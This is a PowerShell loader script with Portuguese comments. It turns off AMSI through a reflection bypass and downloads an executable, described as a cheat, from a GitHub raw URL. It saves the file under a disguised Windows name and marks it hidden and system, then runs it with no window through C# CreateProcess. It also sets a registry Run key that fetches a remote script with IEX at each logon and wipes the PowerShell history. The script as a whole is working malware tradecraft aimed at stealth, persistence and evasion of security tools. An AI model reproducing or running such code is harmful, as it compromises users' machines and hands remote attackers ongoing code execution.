# Bypass do AMSI
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

$url = "https://raw.githubusercontent.com/suprazxx/yoxmenu/refs/heads/main/koxmenu.exe"
# Vamos salvar na AppData do usuário em vez da Temp (menos visado)
$hidePath = "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\WinSync.exe"

try {
    # 1. Baixa o cheat (usando WebClient para não gerar log de requisição HTTP no Event Viewer do Windows)
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($url, $hidePath)

    # 2. Aplica atributos para esconder o arquivo do sistema
    # Hidden (2) + System (4) = 6. Isso impede que o Windows Search ou usuários vejam o arquivo
    $fileInfo = Get-Item $hidePath
    $fileInfo.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System

    # 3. Código C# para rodar sem janela e sem gerar logs de console
    $code = @"
using System;
using System.Runtime.InteropServices;

public class GhostProcess {
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess, hThread;
        public int dwProcessId, dwThreadId;
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    public static void Run(string path) {
        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(si);
        si.dwFlags = 0x00000001; // STARTF_USESHOWWINDOW
        si.wShowWindow = 0;      // SW_HIDE
        
        // 0x08000000 = CREATE_NO_WINDOW
        // 0x00000008 = DETACHED_PROCESS 
        // 0x00000200 = CREATE_NEW_PROCESS_GROUP
        uint flags = 0x08000000 | 0x00000008 | 0x00000200;
        
        PROCESS_INFORMATION pi;
        CreateProcess(path, null, IntPtr.Zero, IntPtr.Zero, false, flags, IntPtr.Zero, null, ref si, out pi);
    }
}
"@
    Add-Type -TypeDefinition $code -Language CSharp
    
    # 4. Executa o processo invisível
    [GhostProcess]::Run($hidePath)

    # 5. Persistência (O comando no registro está ajustado para chamar o script de novo)
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $cmd = "powershell -WindowStyle Hidden -Command `"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/suprazxx/yoxmenu/refs/heads/main/sync.ps1')`""
    Set-ItemProperty -Path $regPath -Name "WinSyncClient" -Value $cmd

    # 6. Limpa histórico do PowerShell
    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
} catch {
    # Silêncio total. Se falhar, não faz nada.
}
